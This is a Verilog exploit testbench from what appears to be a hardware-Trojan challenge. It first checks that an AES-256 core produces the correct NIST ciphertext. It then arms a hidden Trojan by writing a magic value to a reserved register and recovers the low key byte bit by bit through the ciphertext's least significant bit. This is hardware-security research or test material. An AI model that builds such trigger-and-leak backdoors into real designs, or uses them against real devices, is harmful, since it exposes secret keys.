//======================================================================
// tb_aes_synth_trojan.v
// Exploit testbench for Challenge 1 (Hard) - netlist-level key-LSB leak.
//
// Phase 1: a normal AES-256 encryption (Trojan disarmed) produces the
//          correct NIST SP800-38A ciphertext -> normal path intact.
// Phase 2: arm the Trojan (write 0xA5A5A5A5 to reserved addr 0x0b), then
//          run 8 encryptions. Each completed block drives key[7:0]'s next
//          bit onto the ciphertext LSB (result_reg[0], read via RESULT3),
//          so the observer recovers the low key byte over 8 encryptions.
//======================================================================
`default_nettype none
`timescale 1ns/1ps

module tb_aes_synth_trojan();
  localparam CLK_HALF = 1;
  localparam ADDR_CTRL = 8'h08, ADDR_STATUS = 8'h09, ADDR_CONFIG = 8'h0a;
  localparam ADDR_KEY0 = 8'h10, ADDR_BLOCK0 = 8'h20, ADDR_RESULT0 = 8'h30;
  localparam ADDR_ARM = 8'h0b;

  reg clk, reset_n, cs, we;
  reg [7:0] address;
  reg [31:0] write_data;
  wire [31:0] read_data;
  reg [31:0] rd;
  reg [127:0] ct;
  reg [7:0]   leaked;
  integer i;

  // NIST SP800-38A AES-256 ECB vector.
  localparam [255:0] K256 = 256'h603deb1015ca71be2b73aef0857d77811f352c073b6108d72d9810a30914dff4;
  localparam [127:0] PT   = 128'h6bc1bee22e409f96e93d7e117393172a;
  localparam [127:0] CT   = 128'hf3eed1bdb5d2a03c064b5a7e3db181f8;
  localparam [7:0]   KEYLSB = 8'hf4;   // low byte of K256 == key[7:0]

  aes dut(.clk(clk), .reset_n(reset_n), .cs(cs), .we(we),
          .address(address), .write_data(write_data), .read_data(read_data));

  always #CLK_HALF clk = !clk;

  task wr(input [7:0] a, input [31:0] d);
    begin @(negedge clk); cs=1; we=1; address=a; write_data=d; @(negedge clk); cs=0; we=0; end
  endtask
  task rdw(input [7:0] a);
    begin @(negedge clk); cs=1; we=0; address=a; @(negedge clk); rd=read_data; cs=0; end
  endtask
  task waitready; begin rdw(ADDR_STATUS); while(!rd[0]) rdw(ADDR_STATUS); end endtask

  task load_key256(input [255:0] k);
    integer j;
    begin
      for (j=0;j<8;j=j+1) wr(ADDR_KEY0+j, k[255-32*j -: 32]);
      wr(ADDR_CONFIG, 32'h3);              // encdec=1 (encipher), keylen=1 (256)
      wr(ADDR_CTRL, 32'h1);                // init
      waitready;
    end
  endtask

  task encrypt(input [127:0] pt);
    integer j;
    begin
      for (j=0;j<4;j=j+1) wr(ADDR_BLOCK0+j, pt[127-32*j -: 32]);
      wr(ADDR_CONFIG, 32'h3);
      wr(ADDR_CTRL, 32'h2);                // next
      waitready;
    end
  endtask

  initial begin
    clk=0; reset_n=0; cs=0; we=0; address=0; write_data=0; leaked=0;
    #10 reset_n=1; #10;
    $display("=== Challenge 1 (Hard): netlist key-LSB leak ===");

    load_key256(K256);

    // Phase 1 - disarmed: full ciphertext must be correct.
    encrypt(PT);
    rdw(ADDR_RESULT0+0); ct[127:96]=rd;
    rdw(ADDR_RESULT0+1); ct[95:64]=rd;
    rdw(ADDR_RESULT0+2); ct[63:32]=rd;
    rdw(ADDR_RESULT0+3); ct[31:0]=rd;
    $display("[normal] ciphertext = %032x", ct);
    if (ct===CT) $display("[normal] PASS: matches NIST AES-256 vector.");
    else begin $display("[normal] FAIL: expected %032x", CT); $finish; end

    // Phase 2 - arm and leak key[7:0] one bit per encryption.
    wr(ADDR_ARM, 32'hA5A5A5A5);
    $display("[exploit] armed; leaking key[7:0] via ciphertext LSB");
    for (i=0;i<8;i=i+1) begin
      encrypt(PT);
      rdw(ADDR_RESULT0+3);                 // RESULT3 bit0 == ciphertext LSB
      leaked[i] = rd[0];
      $display("[exploit] encryption %0d -> LSB = %0d", i, rd[0]);
    end
    $display("[exploit] recovered key[7:0] = 0x%02x (expected 0x%02x)", leaked, KEYLSB);
    if (leaked===KEYLSB) $display("*** EXPLOIT SUCCESS: key[7:0] recovered via ciphertext LSB. ***");
    else $display("*** EXPLOIT FAILED. ***");
    $finish;
  end

  initial begin #5000000 $display("timeout"); $finish; end
endmodule
`default_nettype wire
